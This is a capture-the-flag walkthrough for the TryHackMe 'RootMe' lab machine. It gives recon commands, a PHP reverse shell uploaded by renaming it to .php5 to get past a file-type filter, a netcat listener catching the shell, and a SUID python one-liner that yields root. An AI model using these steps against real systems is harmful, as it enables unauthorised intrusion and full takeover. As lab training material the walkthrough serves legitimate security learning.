# RootMe @TryHackMe

Difficulty: EASY

Keywords and tools: nmap, dirb, ncat, google, python

### Check that host is alive
```
$ ping 10.10.108.171                                                                                       
PING 10.10.108.171 (10.10.108.171) 56(84) bytes of data.
64 bytes from 10.10.108.171: icmp_seq=1 ttl=63 time=48.4 ms
64 bytes from 10.10.108.171: icmp_seq=2 ttl=63 time=51.3 ms
```
### nmap scan
```
$nmap -sV -n -v -Pn -p- -T4 -A 10.10.108.171
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have ports 22 and 80 open, so SSH and web app.

### Lets run dirb, nikto and visit the site via browser.
```
$ dirb http://10.10.108.171  
---- Scanning URL: http://10.10.108.171/ ----
==> DIRECTORY: http://10.10.108.171/css/                                                                         
+ http://10.10.108.171/index.php (CODE:200|SIZE:616)                                                             
==> DIRECTORY: http://10.10.108.171/js/                                                                          
==> DIRECTORY: http://10.10.108.171/panel/                                                                       
+ http://10.10.108.171/server-status (CODE:403|SIZE:278)
```
```
$ -h nikto 10.10.108.171
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
```
Now we have all the answers for Reconnaissance questions.

Lets visit "http://10.10.108.171/panel/". Looks like you can upload files.

### We need to create a shell.
```
$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
Open the file and edit row 49 and 50 to match your IP and desired port.

Then upload the file to target_ip/panel.

Apparently uploading php file is not permitted. Rename file to .php5 and try again.

Once the php5 is uploaded. Start a netcat listener and open the shell via browser 10.10.108.171/shell.php.
```
$ nc -lvnp 1234                                                                                      
listening on [any] 1234 ...
connect to [10.8.155.124] from (UNKNOWN) [10.10.169.110] 47264
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:17:15 up 12 min,  0 users,  load average: 0.08, 0.68, 0.69
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ find / -name user.txt 2>/dev/null
/var/www/user.txt
$ $ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

THM gives a hint on the next question: find / -user root -perm /4000

```
find / -user root -perm /4000 2>/dev/null
```
Apparently python is unusual.

Lets google "python SUID" > https://gtfobins.github.io/gtfobins/python/

```
cd /usr/bin
$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
$ find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null
/root/root.txt
cat /root/root.txt
```
And we have the last flag.
